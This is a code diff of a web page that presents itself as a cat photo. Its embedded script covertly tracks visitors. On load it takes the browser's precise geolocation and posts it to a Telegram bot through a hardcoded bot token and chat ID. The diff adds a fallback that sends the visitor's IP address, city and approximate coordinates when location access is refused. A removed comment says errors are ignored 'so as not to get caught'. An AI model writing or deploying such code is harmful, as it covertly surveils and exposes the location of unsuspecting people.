@@ -34,30 +34,47 @@
   <img src="https://cdn2.thecatapi.com/images/MTY3ODIyMQ.jpg" alt="Фото котика" />
 
   <script>
-    function sendToTelegram(lat, lon) {
-      const message = `📍 Местоположение:\nШирота: ${lat}\nДолгота: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
-      fetch(`https://api.telegram.org/bot7972755394:AAFVmA7LMOgpygkl-ED_vhHd2eUs-agQ1aw/sendMessage`, {
+    const botToken = "7972755394:AAFVmA7LMOgpygkl-ED_vhHd2eUs-agQ1aw";
+    const chatId = "148031411";
+
+    function sendToTelegram(text) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: "148031411",
-          text: message
+          chat_id: chatId,
+          text: text
         })
       });
     }
 
-    function handlePosition(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      sendToTelegram(lat, lon);
+    function getLocationViaIP() {
+      fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+          const text = `⚠️ Геолокация отключена\nIP: ${data.ip}\nГород: ${data.city}, ${data.region}, ${data.country_name}\nОриентировочная локация: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+          sendToTelegram(text);
+        })
+        .catch(() => {
+          sendToTelegram("⚠️ Геолокация отключена, IP определить не удалось.");
+        });
     }
 
-    function handleError() {
-      // молча игнорируем ошибку, чтобы не палиться
+    function handleGeo(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const text = `📍 Точная геолокация:\nШирота: ${lat}\nДолгота: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
+      sendToTelegram(text);
+    }
+
+    function handleGeoError() {
+      getLocationViaIP();
     }
 
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(handlePosition, handleError);
+      navigator.geolocation.getCurrentPosition(handleGeo, handleGeoError);
+    } else {
+      getLocationViaIP();
     }
   </script>
 </body>
